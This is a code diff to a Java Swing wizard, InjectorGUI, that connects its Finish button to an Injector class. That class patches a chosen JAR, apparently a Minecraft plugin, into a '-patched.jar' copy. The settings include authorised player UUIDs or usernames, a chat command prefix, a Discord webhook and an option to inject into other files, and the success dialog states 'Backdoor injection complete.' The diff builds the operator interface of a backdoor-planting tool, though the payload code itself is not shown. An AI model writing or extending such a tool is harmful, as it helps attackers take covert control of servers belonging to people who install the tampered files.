@@ -10,6 +10,11 @@ import java.util.LinkedHashMap;
 import java.util.Locale;
 import java.util.Map;
 
+// Assuming the Injector class is in the same package.
+// If not, you may need to adjust this import.
+import com.zeroedindustries.debugger.Injector;
+
+
 public class InjectorGUI extends JDialog {
     private CardLayout cardLayout;
     private JPanel cardPanel;
@@ -21,6 +26,7 @@ public class InjectorGUI extends JDialog {
 
     private final Map<String, String> lookAndFeels = new LinkedHashMap<>();
 
+    // Data collected from the wizard
     private File selectedJarFile;
     private String minecraftUUIDs;
     private boolean useUsernames;
@@ -28,6 +34,7 @@ public class InjectorGUI extends JDialog {
     private String discordWebhook;
     private boolean injectOther;
     private boolean warnings;
+
     public static void displayError(String message) {
         JOptionPane.showMessageDialog(null, message, "Error", JOptionPane.ERROR_MESSAGE);
     }
@@ -42,8 +49,8 @@ public class InjectorGUI extends JDialog {
 
         lookAndFeels.put("Nimbus", "javax.swing.plaf.nimbus.NimbusLookAndFeel");
         lookAndFeels.put("MetalUI", "javax.swing.plaf.metal.MetalLookAndFeel");
-        lookAndFeels.put("Solarized Light","com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatMTSolarizedLightIJTheme");
-        lookAndFeels.put("Cobalt 2","com.formdev.flatlaf.intellijthemes.FlatCobalt2IJTheme");
+        lookAndFeels.put("Solarized Light", "com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatMTSolarizedLightIJTheme");
+        lookAndFeels.put("Cobalt 2", "com.formdev.flatlaf.intellijthemes.FlatCobalt2IJTheme");
 
         initComponents();
 
@@ -355,13 +362,13 @@ public class InjectorGUI extends JDialog {
         JTextArea area = (JTextArea) summaryPanel.getClientProperty("summaryArea");
 
         StringBuilder sb = new StringBuilder();
-        sb.append("File: ").append(selectedJarFile != null ? selectedJarFile.getAbsolutePath() : "None").append("\n");
-        sb.append("Use Usernames: ").append(useUsernames).append("\n");
-        sb.append("UUIDs/Usernames: ").append(minecraftUUIDs).append("\n");
-        sb.append("Prefix: ").append(chatPrefix).append("\n");
-        sb.append("Discord Webhook: ").append(discordWebhook.isEmpty() ? "(none)" : discordWebhook).append("\n");
+        sb.append("File:             ").append(selectedJarFile != null ? selectedJarFile.getAbsolutePath() : "None").append("\n");
+        sb.append("Auth Mode:        ").append(useUsernames ? "Usernames (Offline)" : "UUIDs (Online)").append("\n");
+        sb.append("Users:            ").append(minecraftUUIDs.isEmpty() ? "(auth disabled)" : minecraftUUIDs).append("\n");
+        sb.append("Prefix:           ").append(chatPrefix).append("\n");
+        sb.append("Discord Webhook:  ").append(discordWebhook.isEmpty() ? "(none)" : discordWebhook).append("\n");
         sb.append("Inject to others: ").append(injectOther).append("\n");
-        sb.append("Debug: ").append(warnings);
+        sb.append("Debug messages:   ").append(warnings);
 
         area.setText(sb.toString());
     }
@@ -400,12 +407,37 @@ public class InjectorGUI extends JDialog {
             cardLayout.next(cardPanel);
             if (step == steps.length - 1) updateSummary();
         } else {
-            JOptionPane.showMessageDialog(this, "Injection would begin now.", "Info", JOptionPane.INFORMATION_MESSAGE);
+            // --- INJECTION CODE MERGED HERE ---
+            // This is the "Finish" button action
+            performInjection();
             dispose();
         }
 
         updateButtons();
         progressPanel.setCurrentStep(step);
+    }
+
+    private void performInjection() {
+        // 1. Get InPath and create OutPath
+        String inPath = selectedJarFile.getAbsolutePath();
+        int sep = inPath.lastIndexOf(".");
+        String outPath = inPath.substring(0, sep) + "-patched.jar";
+
+        // 2. Parse UUIDs/Usernames
+        String[] splitUUID = minecraftUUIDs.split(",");
+
+        // 3. Create config object
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(useUsernames, splitUUID, chatPrefix, discordWebhook, injectOther, warnings);
+
+        // 4. Call patchFile method
+        boolean success = Injector.patchFile(inPath, outPath, sc, true, true, true);
+
+        // 5. Show result dialog
+        if (success) {
+            JOptionPane.showMessageDialog(this, "Backdoor injection complete.\nOutput file: " + outPath, "Success", JOptionPane.INFORMATION_MESSAGE);
+        } else {
+            JOptionPane.showMessageDialog(this, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.\nPlease run the injector again with debug messages on before submitting issues.", "Injection Failed", JOptionPane.ERROR_MESSAGE);
+        }
     }
 
     private void updateButtons() {
@@ -418,7 +450,7 @@ public class InjectorGUI extends JDialog {
         try {
             UIManager.setLookAndFeel(laf);
             SwingUtilities.updateComponentTreeUI(this);
-            pack();
+            // pack(); // Packing might resize window unexpectedly, consider removing if problematic
         } catch (Exception e) {
             JOptionPane.showMessageDialog(this, "Failed to set LAF: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
         }
@@ -427,7 +459,8 @@ public class InjectorGUI extends JDialog {
     public static void main(String[] args) {
         try {
             UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) {
+        }
 
         SwingUtilities.invokeLater(() -> {
             InjectorGUI gui = new InjectorGUI(null);
